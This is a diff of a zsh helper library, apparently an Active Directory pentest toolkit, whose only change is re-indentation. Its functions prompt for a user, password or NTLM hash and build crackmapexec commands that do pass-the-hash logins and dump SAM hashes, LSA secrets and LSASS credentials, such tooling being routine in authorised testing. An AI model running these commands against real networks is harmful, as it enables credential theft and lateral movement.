@@ -33,9 +33,9 @@ nb-ad-pth-pass() {
     __ask "Enter target AD domain (must also be set in your hosts file)"
     nb-vars-set-domain
     __ask "Enter a user account"
-	__check-user
-	__ask "Enter a password for authentication"
-	__check-pass
+	  __check-user
+	  __ask "Enter a password for authentication"
+	  __check-pass
     nb-vars-set-network
 
     print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -d ${__DOMAIN} -p ${__PASS}"
@@ -45,9 +45,9 @@ nb-ad-pth-exploit() {
     __check-project
     nb-vars-set-network
     __ask "Enter a user account"
-	__check-user
-	__ask "Enter a NTLM hash"
-	__check-hash
+  	__check-user
+  	__ask "Enter a NTLM hash"
+  	__check-hash
 
 	print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth"
 }
@@ -56,9 +56,9 @@ nb-ad-pth-sam() {
     __check-project
     nb-vars-set-network
     __ask "Enter a user account"
-	__check-user
-	__ask "Enter a NTLM hash"
-	__check-hash
+	  __check-user
+	  __ask "Enter a NTLM hash"
+	  __check-hash
 
 	print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --sam"
 }
@@ -67,9 +67,9 @@ nb-ad-pth-enum() {
     __check-project
     nb-vars-set-network
     __ask "Enter a user account"
-	__check-user
-	__ask "Enter a NTLM hash"
-	__check-hash
+	  __check-user
+	  __ask "Enter a NTLM hash"
+	  __check-hash
 
 	print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --shares"
 }
@@ -78,9 +78,9 @@ nb-ad-pth-lsa() {
     __check-project
     nb-vars-set-network
     __ask "Enter a user account"
-	__check-user
-	__ask "Enter a NTLM hash"
-	__check-hash
+	  __check-user
+	  __ask "Enter a NTLM hash"
+	  __check-hash
 
 	print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth --lsa"
 }
@@ -89,9 +89,9 @@ nb-ad-pth-lsassy() {
     __check-project
     nb-vars-set-network
     __ask "Enter a user account"
-	__check-user
-	__ask "Enter a NTLM hash"
-	__check-hash
+	  __check-user
+	  __ask "Enter a NTLM hash"
+	  __check-hash
 
 	print -z "crackmapexec smb ${__NETWORK} -u ${__USER} -H ${__HASH} --local-auth -M lsassy"
 }
